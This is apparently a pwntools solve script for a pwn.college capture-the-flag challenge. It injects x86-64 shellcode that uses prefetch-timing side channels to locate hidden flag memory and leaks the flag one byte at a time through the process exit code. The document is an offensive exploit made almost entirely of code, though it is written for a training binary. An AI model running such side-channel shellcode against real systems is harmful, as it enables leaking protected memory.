#!/usr/bin/env python3
from pwn import *
import struct

def create_shellcode(start_addr, end_addr, flag_char_index):
    """
    Creates shellcode that searches for flag using prefetch timing
    """
    
    # Use raw assembly instructions to avoid pwntools assembly issues
    shellcode = asm(f'''
        mov r12, {start_addr}
        mov r13, {end_addr}  
        mov r14, {flag_char_index}
        mov r15, 800
        
    search_loop:
        cmp r12, r13
        jge not_found
        
        mfence
        rdtsc
        mov r8, rax
        
        prefetcht2 [r12]
        
        mfence  
        rdtsc
        sub rax, r8
        
        cmp rax, r15
        jl found_candidate
        
        add r12, 0x1000
        jmp search_loop
        
    found_candidate:
        mov rax, r12
        add rax, r14
        
        mov bl, byte ptr [rax]
        movzx rdi, bl
        
        mov rax, 60
        syscall
        
    not_found:
        mov rax, 60
        mov rdi, 255
        syscall
    ''', arch='amd64')
    
    return shellcode

s = '''
b * main+917
'''
def solve_challenge():
    flag = ""
    
    for char_index in range(64):
        print(f"Extracting character {char_index}...")
        
        # Search in smaller, more targeted ranges
        search_ranges = [
            (0x10000000, 0x100000000), # 4GB range
        ]
        
        found_char = None
        
        for start_addr, end_addr in search_ranges:
            if found_char is not None:
                break
                
            print(f"  Searching range 0x{start_addr:x} - 0x{end_addr:x}")
            
            for attempt in range(5):  # More attempts
                try:
                    p = process('./babyarch_prefetchpeek')
                    gdb.attach(p, s)
                    
                    pause()
                    p.recvuntil(b'Reading 0x1000 bytes of shellcode from stdin.')
                    
                    shellcode = create_shellcode(start_addr, end_addr, char_index)
                    print(f"  Shellcode length: {len(shellcode)} bytes")
                    
                    if len(shellcode) > 0x1000:
                        print(f"  Shellcode too large!")
                        p.close()
                        continue
                        
                    shellcode = shellcode.ljust(0x1000, b'\x90')
                    p.send(shellcode)
                    
                    # Give it time to execute
                    try:
                        p.wait(timeout=10)
                        exit_code = p.poll()
                        
                        if exit_code is not None and 32 <= exit_code <= 126:
                            char = chr(exit_code)
                            print(f"    Attempt {attempt + 1}: Found '{char}' (0x{exit_code:02x})")
                            found_char = char
                            p.close()
                            break
                        elif exit_code == 0:
                            # Null terminator
                            found_char = '\x00'
                            p.close()
                            break
                            
                    except Exception as e:
                        print(f"    Attempt {attempt + 1}: Timeout/error: {e}")
                        
                    p.close()
                    
                except Exception as e:
                    print(f"    Attempt {attempt + 1} failed: {e}")
                    try:
                        p.close()
                    except:
                        pass
                        
        if found_char is not None:
            if found_char == '\x00':
                print("Found null terminator, stopping")
                break
            flag += found_char
            print(f"Flag so far: '{flag}'")
            
            if '}' in flag and flag.startswith('pwn.college{'):
                print("Flag looks complete!")
                break
        else:
            print(f"Could not find character {char_index}")
            break
            
    print(f"\nFinal flag: {flag}")
    return flag

if __name__ == "__main__":
    solve_challenge()
